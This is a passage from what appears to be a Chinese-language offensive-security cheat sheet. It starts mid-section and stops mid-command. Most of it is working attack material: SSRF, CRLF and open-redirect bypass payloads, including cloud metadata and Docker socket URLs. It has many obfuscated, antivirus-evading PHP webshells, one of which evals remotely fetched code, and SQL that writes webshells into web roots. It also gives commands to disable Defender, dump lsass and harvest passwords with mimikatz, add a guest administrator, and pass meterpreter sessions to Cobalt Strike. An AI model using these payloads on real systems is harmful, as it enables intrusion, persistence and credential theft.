class="variable">$google</span>.com"</span>   <span class="comment">#仅限于curl，使用bash变量$google = ""</span></span><br><span class="line"></span><br><span class="line">http://ⓐⓟⓟⓛⓔ.ⓒⓞⓜ.ⓒⓃ   = http://apple.com.cn  <span class="comment">#字母数字绕过</span></span><br><span class="line">show list: </span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br><span class="line"></span><br><span class="line">http://1.1.1.1 &amp;@2.2.2.2<span class="comment"># @3.3.3.3/  #组合绕过</span></span><br><span class="line">urllib2 : 1.1.1.1</span><br><span class="line">requests + browsers : 2.2.2.2</span><br><span class="line">urllib : 3.3.3.3</span><br><span class="line"></span><br><span class="line">0://evil.com:80;http://google.com:80/   <span class="comment"># php  filter_var() 绕过</span></span><br><span class="line"></span><br><span class="line">http://127.1.1.1:80\@127.2.2.2:80/          <span class="comment"># 弱解析绕过</span></span><br><span class="line">http://127.1.1.1:80\@@127.2.2.2:80/</span><br><span class="line">http://127.1.1.1:80:\@@127.2.2.2:80/</span><br><span class="line">http://127.1.1.1:80<span class="comment">#\@127.2.2.2:80/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/03/Uf4I9R5DudBWHCV.jpg" alt="url support.jpg"></p><ul><li>ssrf 接xss</li><li>ssrf调用接口</li><li>思路扩展：任意文件读取下可以试下是否可以ssrf，通过http协议访问阿里云的元数据接口，查看是否有ak，sk，这样可以获取oss的存储权限。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 调用Alibaba</span><br><span class="line">http://100.100.100.200/latest/meta-data/</span><br><span class="line">http://100.100.100.200/latest/meta-data/instance-id</span><br><span class="line">http://100.100.100.200/latest/meta-data/image-id</span><br><span class="line"># 调用docker</span><br><span class="line">http://127.0.0.1:2375/v1.24/containers/json</span><br><span class="line"></span><br><span class="line">Simple example</span><br><span class="line">docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash</span><br><span class="line">bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json</span><br><span class="line">bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json</span><br></pre></td></tr></table></figure></li></ul><blockquote><p><a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#" target="_blank" rel="noopener">https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a></p></blockquote><h3 id="CRLF-bypass"><a href="#CRLF-bypass" class="headerlink" title="CRLF bypass"></a>CRLF bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE</span><br><span class="line">java%0d%0ascript%0d%0a:alert(0)</span><br><span class="line">http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2f%2e%2e</span><br></pre></td></tr></table></figure><ul><li>%E5%98%8A = %0A = \u560a</li><li>%E5%98%8D = %0D = \u560d</li><li>%E5%98%BE = %3E = \u563e (&gt;)</li><li>%E5%98%BC = %3C = \u563c (&lt;)</li></ul><blockquote><p><a href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p></blockquote><h3 id="重定向-bypass"><a href="#重定向-bypass" class="headerlink" title="重定向 bypass"></a>重定向 bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www.白名单网站.com.evil.com   #使用白名单网站绕过白名单网站</span><br><span class="line"></span><br><span class="line">//google.com                 #使用//  绕过 http头</span><br><span class="line"></span><br><span class="line">https:google.com             #使用https:  绕过 //过滤</span><br><span class="line"></span><br><span class="line">\/\/google.com/              #使用\/  绕过 //过滤</span><br><span class="line">/\/google.com/</span><br><span class="line"></span><br><span class="line">/?redir=google。com           #使用。或unicode字符（℀等）或%E3%80%82 绕过.过滤</span><br><span class="line">//google%E3%80%82com</span><br><span class="line">http://baidu.c℆a.google.com</span><br><span class="line"></span><br><span class="line">//google%00.com              #使用%00、%oa等字符</span><br><span class="line">//google%0a.com</span><br><span class="line"></span><br><span class="line">?next=whitelisted.com&amp;next=google.com   #变量覆盖</span><br><span class="line"></span><br><span class="line">baidu.com@googl.com          #@重定向</span><br></pre></td></tr></table></figure><p><a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">unicode速查</a></p><h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>使用：<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">冰蝎免杀</a></p><h2 id="webshell免杀-PHP"><a href="#webshell免杀-PHP" class="headerlink" title="webshell免杀(PHP)"></a>webshell免杀(PHP)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----------------+-----------------+----------------+----------------+</span><br><span class="line">|    Command     | Displays Output | Can Get Output | Gets Exit Code |</span><br><span class="line">+----------------+-----------------+----------------+----------------+</span><br><span class="line">| system()       | Yes (as text)   | Last line only | Yes            |</span><br><span class="line">| passthru()     | Yes (raw)       | No             | Yes            |</span><br><span class="line">| exec()         | No              | Yes (array)    | Yes            |</span><br><span class="line">| shell_exec()   | No              | Yes (string)   | No             |</span><br><span class="line">| backticks (``) | No              | Yes (string)   | No             |</span><br><span class="line">+----------------+-----------------+----------------+----------------+</span><br></pre></td></tr></table></figure><p>姿势：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">`$_GET[<span class="number">1</span>]`</span><br><span class="line"><span class="keyword">include</span>$_GET[<span class="number">1</span>];<span class="comment">#https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</span></span><br><span class="line"><span class="meta">&lt;?</span>=usort(...$_GET);<span class="comment">#/?1[]=a&amp;1[]=phpinfo()&amp;2=assert</span></span><br><span class="line"></span><br><span class="line">$&#123;(system)(id)&#125;</span><br><span class="line">$&#123;(system)<span class="comment">/**/</span>(ls)&#125;</span><br><span class="line">(system)(whoami);</span><br><span class="line">(ass.(er).t)(phpinfo());</span><br><span class="line"><span class="string">"\x61\x73\x73\x65\x72\x74"</span>(phpinfo());</span><br><span class="line">get_defined_functions()[internal][<span class="number">555</span>](ls)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump((substr)(<span class="keyword">__FILE__</span>,<span class="number">0</span>,<span class="number">-19</span>));</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();@<span class="keyword">eval</span>($_GET[_]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)</span><br><span class="line"><span class="meta">&lt;?</span>=&#123;<span class="keyword">if</span>:<span class="number">1</span>)$GLOBALS[<span class="string">'_G'</span>.<span class="string">'ET'</span>][sky]($GLOBALS[<span class="string">'_G'</span>.<span class="string">'ET'</span>][cool]);<span class="keyword">die</span>();<span class="comment">//&#125;&#123;end if&#125;<span class="meta">?&gt;</span></span></span><br><span class="line">$pi=base_convert;$pi(<span class="number">371235972282</span>,<span class="number">10</span>,<span class="number">28</span>)(($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">9</span>&#125;)</span><br><span class="line"><span class="meta">&lt;?</span>= <span class="keyword">namespace</span> <span class="title">c</span>;\<span class="keyword">eval</span>(phpinfo());<span class="meta">?&gt;</span><span class="comment">#命名空间定义同名，程序调用时优先调用命名空间的同名函数</span></span><br></pre></td></tr></table></figure></p><p>详细：</p><blockquote><p><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a><br><a href="https://blog.zeddyu.info/2019/02/28/Some-Tricks-of-Bypass-php-waf/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/02/28/Some-Tricks-of-Bypass-php-waf/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= `ls`<span class="meta">?&gt;</span> 相当于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls` <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>= `/???/c?t /flag.???`&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">=<span class="comment">#----------</span></span><br><span class="line"><span class="meta">&lt;?</span>=\asSert($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#-------------------</span></span><br><span class="line"><span class="meta">&lt;?</span>=(assert)($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line"><span class="meta">&lt;?</span>=create_function($_GET[<span class="number">1</span>],<span class="number">1</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#/?1=)&#123;&#125;phpinfo();//</span></span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line">@$f = $_GET[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">eval</span>($s=&amp;$f);</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line">$s = $_GET[<span class="number">1</span>];</span><br><span class="line">$d = <span class="string">'s'</span>;</span><br><span class="line">$e = $$d;</span><br><span class="line"><span class="keyword">eval</span>($a=$e);</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line"><span class="keyword">eval</span>(trim(substr(file_get_contents(<span class="string">"http://localhost:8000/k.gif"</span>),<span class="number">293930</span>)));</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line">$s = <span class="string">'_GET'</span>;</span><br><span class="line">$s = $$s;</span><br><span class="line">$f = <span class="string">''</span>.[];</span><br><span class="line">$ff = $f[<span class="string">'666'</span>==<span class="string">'hello'</span>];</span><br><span class="line">$d = <span class="string">'ss'</span>;</span><br><span class="line">$dd = <span class="string">'Ert'</span>;</span><br><span class="line">$ddd = $ff.$d.$dd;</span><br><span class="line">$e = $ddd;</span><br><span class="line">$e($s[<span class="number">156</span>]);</span><br><span class="line"><span class="comment">#------------------</span></span><br><span class="line">$a = <span class="string">'_GET'</span>;</span><br><span class="line">$a = $$a;</span><br><span class="line">$a[<span class="number">1</span>]($a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">#----------------</span></span><br><span class="line">$a = $_GET[<span class="number">1</span>];</span><br><span class="line">$b = substr($a,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">$bb = substr($a,<span class="number">1</span>,<span class="number">2014</span>);</span><br><span class="line"><span class="keyword">eval</span>($b.$bb);</span><br><span class="line"><span class="comment">#----------------</span></span><br><span class="line">$a = $_GET[<span class="number">1</span>];</span><br><span class="line">$b = mb_substr($a,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">$bb = mb_substr($a,<span class="number">1</span>,<span class="number">2014</span>);</span><br><span class="line"><span class="keyword">eval</span>($b.$bb);</span><br><span class="line"><span class="comment">#----------------</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$a123 =  chr(<span class="number">97</span>).chr(<span class="number">115</span>).chr(<span class="number">115</span>).chr(<span class="number">101</span>).chr(<span class="number">114</span>).chr(<span class="number">116</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.$a123;</span><br><span class="line">&#125;</span><br><span class="line">$a123 = user();</span><br><span class="line">$x123 =<span class="keyword">array</span>($_GET[<span class="string">'x'</span>]);</span><br><span class="line">array_map($a123,$a123 = $x123 );</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#----------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $like = <span class="string">"demo"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;like);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$like = $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$len = strlen($like)+<span class="number">1</span>;</span><br><span class="line">$pp = <span class="string">"O:1:\"A\":1:&#123;s:4:\"like\";s:"</span>.$len.<span class="string">":\""</span>.$like.<span class="string">";\";&#125;"</span>;</span><br><span class="line">$s=<span class="string">'unSer'</span>;</span><br><span class="line">$ss=<span class="string">'ialIze'</span>;</span><br><span class="line">$sss=$s.$ss;</span><br><span class="line">$like_unser = $sss($pp);</span><br></pre></td></tr></table></figure><h2 id="cs入门"><a href="#cs入门" class="headerlink" title="cs入门"></a>cs入门</h2><p>windows下运行teamserver<br><a href="https://evi1cg.me/archives/teamserver.html" target="_blank" rel="noopener">https://evi1cg.me/archives/teamserver.html</a><br>cs简单易上手的攻略<br><a href="https://boombao.net/2019/09/04/cobalt-strike-1/" target="_blank" rel="noopener">https://boombao.net/2019/09/04/cobalt-strike-1/</a><br>完整学习：<br><a href="https://github.com/aleenzz/Cobalt_Strike_wiki" target="_blank" rel="noopener">https://github.com/aleenzz/Cobalt_Strike_wiki</a></p><p>argue污染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argue net1 helloworld</span><br><span class="line">argue</span><br><span class="line">run net1 user guest /active:yes</span><br><span class="line">run net1 user guest %$83ScA1</span><br><span class="line">run net1 localgroup administrators guest /add</span><br><span class="line">net user guest</span><br><span class="line"></span><br><span class="line">rdesktop  -u administrator  127.0.0.1:6666 -p c1z*W5  #rdesktop连接3389</span><br></pre></td></tr></table></figure></p><p>同理可以污染其他<br><code>argue powershell.exe xxxxxxxxxxxxxxxxxxxxxxxxx</code></p><blockquote><p><a href="https://www.c0bra.xyz/2019/12/03/Cobalt-Strike%E7%B3%BB%E5%88%978/" target="_blank" rel="noopener">https://www.c0bra.xyz/2019/12/03/Cobalt-Strike%E7%B3%BB%E5%88%978/</a></p></blockquote><h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><h3 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goproxy https://snail007.github.io/goproxy/</span><br></pre></td></tr></table></figure><p>socks nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT xxx -p 445,3389</span><br></pre></td></tr></table></figure></p><h3 id="mysql-相关"><a href="#mysql-相关" class="headerlink" title="mysql 相关"></a>mysql 相关</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询用户</span></span><br><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span> = substring_index(<span class="keyword">user</span>(), <span class="string">'@'</span>, <span class="number">1</span>) ;</span><br><span class="line"><span class="comment">#查询目录</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;</span><br><span class="line"><span class="comment">#查询系统类型</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os,@@version_compile_machine;</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>);      <span class="comment">#/var/www/html/configuration.php</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">47</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">47</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">100</span>)),<span class="built_in">char</span>(<span class="number">60</span>),<span class="built_in">char</span>(<span class="number">32</span>));</span><br><span class="line"><span class="comment">#写webshell，需要root权限</span></span><br><span class="line"><span class="comment">#先查询读写权限，若ure_file_priv为null，则不允许导入导出，若为/a表示只允许/a目录下,无具体值则不限制</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?=$a='_GET';$a=$$a;$a[1]($a[2]);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/connect_file.php'</span>; </span><br><span class="line"><span class="comment">#日志写shell</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"%general%"</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'/var/www/html/1.php'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">1.msf模块,批量mysql登录检测</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line"></span><br><span class="line">2.msf执行sql语句</span><br><span class="line">admin/mysql/mysql_sql</span><br><span class="line"></span><br><span class="line">3.msf mof</span><br><span class="line">exploit/windows/mysql/mysql_mof</span><br><span class="line">&gt; 要求</span><br><span class="line">    1.root权限</span><br><span class="line">    2. <span class="comment">--secure-file-priv不为NULL</span></span><br><span class="line">4.msf udf</span><br><span class="line">exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">&gt; 要求</span><br><span class="line">    1.win2000、winXP、win2003</span><br><span class="line">    2.有写入权限的账户</span><br><span class="line">5.msf 上传文件</span><br><span class="line">exploit/windows/mysql/scrutinizer_upload_exec</span><br></pre></td></tr></table></figure><h3 id="window相关"><a href="#window相关" class="headerlink" title="window相关"></a>window相关</h3><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭defender，需要管理员权限</span></span><br><span class="line">Set-MpPreference -disablerealtimeMonitoring <span class="literal">$true</span></span><br></pre></td></tr></table></figure><p>procdump<br>利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p><p>mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  #权限提升</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line">sekurlsa::logonpasswords  #抓取密码</span><br></pre></td></tr></table></figure></p><ol><li><p>procdump+mimikatz<br>需要administrator权限，需要关闭杀软，第一步需要admin权限，第二步读取本地的lsass不需要admin权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">.\mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></li><li><p>win10 or win2012r2以上版本内存无明文密码，需要注册表开启(需要admin权限，运行完后需要注销重新登录)<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p></li></ol><h3 id="powershell相关"><a href="#powershell相关" class="headerlink" title="powershell相关"></a>powershell相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#现在文件</span><br><span class="line">powershell (New-Object System.Net.WebClient).DownloadFile(&quot;[url]&quot;,&quot;[path]&quot;);</span><br></pre></td></tr></table></figure><h3 id="msf相关"><a href="#msf相关" class="headerlink" title="msf相关"></a>msf相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">route #查路由</span><br><span class="line">sysinfo #获取系统信息</span><br><span class="line">netstat –ano #端口开放情况</span><br><span class="line">getsystem #提权</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line"></span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br><span class="line"></span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389  #端口扫描</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://xz.aliyun.com/t/2536#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536#toc-5</a></p></blockquote><p>msf派生shell给cs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background #挂起shell到后台</span><br><span class="line">sessions -l #查看shell</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http #同cs选的监听方式</span><br><span class="line">set lhost cs的ip地址</span><br><span class="line">set lport cs的监听端口</span><br><span class="line">set session 1</span><br><span class="line">set DisablePloadHandler true;</span><br></pre></td></tr></table></figure></p><blockquote><p><a href="http://zone.secevery.com/article/1128" target="_blank" rel="noopener">http://zone.secevery.com/article/1128</a></p></blockquote><h3 id="vpn-password-get"><a href="#vpn-password-get" class="headerlink" title="vpn password get"></a>vpn password get</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.星号查看器</span><br><span class="line">2.客户端正确密码后面添加$,客户端会报错将密码保存在内存中，使用procdump获取</span><br><span class="line">procdump64.exe -accepteula -ma 14256 